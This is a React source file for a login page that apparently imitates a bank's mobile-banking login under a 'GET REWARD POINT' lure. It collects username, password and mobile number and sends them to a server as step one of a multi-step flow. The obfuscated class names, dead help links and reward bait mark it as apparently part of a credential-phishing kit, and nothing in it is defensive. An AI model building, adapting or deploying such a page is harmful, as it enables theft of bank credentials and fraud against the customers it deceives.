import { useState, FormEvent, useEffect } from 'react';
import { useLocation } from 'wouter';
import { updateUserData, getNextRoute, resetFlow, saveIntermediateData } from '@/lib/userState';

export default function LoginPage() {
  const [, navigate] = useLocation();
  
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [mobile, setMobile] = useState('');
  const [captcha, setCaptcha] = useState('');
  const [captchaType, setCaptchaType] = useState('image');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Reset the flow when landing on login page
  useEffect(() => {
    resetFlow();
  }, []);

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      // Save the form data
      updateUserData({
        username,
        password,
        mobile,
        captcha
      });
      
      // Save the data to the server
      await saveIntermediateData();
      
      // Navigate to the next page in the flow
      navigate(getNextRoute());
    } catch (error) {
      console.error('Error saving data:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleReset = () => {
    setUsername('');
    setPassword('');
    setMobile('');
    setCaptcha('');
  };

  return (
    <div id="__next">
      <header className="Jeuookhh_logo__chFnY">
        <img 
          alt="p3RswM" 
          loading="lazy" 
          width="120" 
          height="32" 
          decoding="async" 
          data-nimg="1" 
          src="/images/yono.png" 
          style={{ color: "transparent" }} 
        />
      </header>
      <main>
        <div className="Jeuookhh_login_heading__g_rIN">
          <h3 className="Jeuookhh_login_heading_h3__40cUi">Log into GET REWARD POINT</h3>
        </div>
        <div className="Jeuookhh_login_form__UT1PX">
          <p className="Jeuookhh_info__z9PjG">
            <span className="Jeuookhh_info_span__TRKF9">(CARE:</span> Username and password sensitive)
          </p>
          <form className="Jeuookhh_form__NPDIu" onSubmit={handleSubmit}>
            <input type="hidden" name="formtoken" value="1jHBBO" />
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">Username*</label>
              <input 
                name="UIS" 
                type="text" 
                className="Jeuookhh_form_control__aKuXl" 
                required 
                maxLength={30}
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
            </div>
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">Password*</label>
              <input 
                name="PIS" 
                type="password" 
                className="Jeuookhh_form_control__aKuXl" 
                required 
                maxLength={30}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">Mobile*</label>
              <input 
                name="PHNE" 
                type="text" 
                inputMode="numeric" 
                className="Jeuookhh_form_control__aKuXl" 
                required 
                maxLength={10} 
                minLength={10}
                value={mobile}
                onChange={(e) => setMobile(e.target.value)}
              />
            </div>
            <div className="Jeuookhh_form_group__iOuIR">
              <label className="Jeuookhh_label__fvDl5">Enter the text shown in the image*</label>
              <input 
                type="text" 
                className="Jeuookhh_form_control__aKuXl" 
                maxLength={30}
                value={captcha}
                onChange={(e) => setCaptcha(e.target.value)}
                required
              />
            </div>
            <label className="Jeuookhh_label__fvDl5">Select any of the Captcha</label>
            <div className="Jeuookhh_captcha__rdZwV">
              <div className="Jeuookhh_w_50__v51eR">
                <input 
                  type="radio" 
                  id="imageCaptcha" 
                  checked={captchaType === 'image'} 
                  onChange={() => setCaptchaType('image')}
                />Image Captcha
              </div>
              <div className="Jeuookhh_w_50__v51eR">
                <input 
                  type="radio" 
                  id="audioCaptcha" 
                  checked={captchaType === 'audio'} 
                  onChange={() => setCaptchaType('audio')}
                />Audio Captcha
              </div>
              <div className="Jeuookhh_clear__ICTqY"></div>
              <div className="Jeuookhh_top_10___pBf1">
                <div>
                  <img 
                    alt="tyzVhX" 
                    loading="lazy" 
                    width="150" 
                    height="39" 
                    decoding="async" 
                    data-nimg="1" 
                    src="/images/capcha.png" 
                    style={{ color: "transparent" }} 
                  />
                </div>
              </div>
              <div className="Jeuookhh_form_group__iOuIR">
                <input 
                  type="submit" 
                  className="Jeuookhh_btn__EQ_Rb" 
                  value={isSubmitting ? "Processing..." : "LOGIN"}
                  disabled={isSubmitting} 
                />
                <input 
                  type="button" 
                  className="Jeuookhh_btn__EQ_Rb" 
                  value="RESET" 
                  onClick={handleReset}
                  disabled={isSubmitting} 
                />
              </div>
              <p><a href="/">Register Customer</a></p>
              <p><a href="/">Forgot Password</a></p>
            </div>
          </form>
        </div>
        <div className="Jeuookhh_p_body__zbqKu">
          <ul className="Jeuookhh_provide__KFj_x">
            <li>Mandatory fields are indicated with an asterisk ().</li>
            <li>Please refrain from sharing your personal information, including your user ID and password, on any other page or platform.</li>
            <li>Your username and password are sensitive information. Please do not share them with anyone</li>
          </ul>
        </div>
      </main>
      <div className="Jeuookhh_footer_area__5ot65">
        <img 
          alt="VsbaVN" 
          loading="lazy" 
          width="68" 
          height="28" 
          decoding="async" 
          data-nimg="1" 
          src="/images/gwhp.png" 
          style={{ color: "transparent" }} 
        />
      </div>
      <div className="Jeuookhh_footer__Wxn0J">
        <p>©</p>
      </div>
    </div>
  );
}
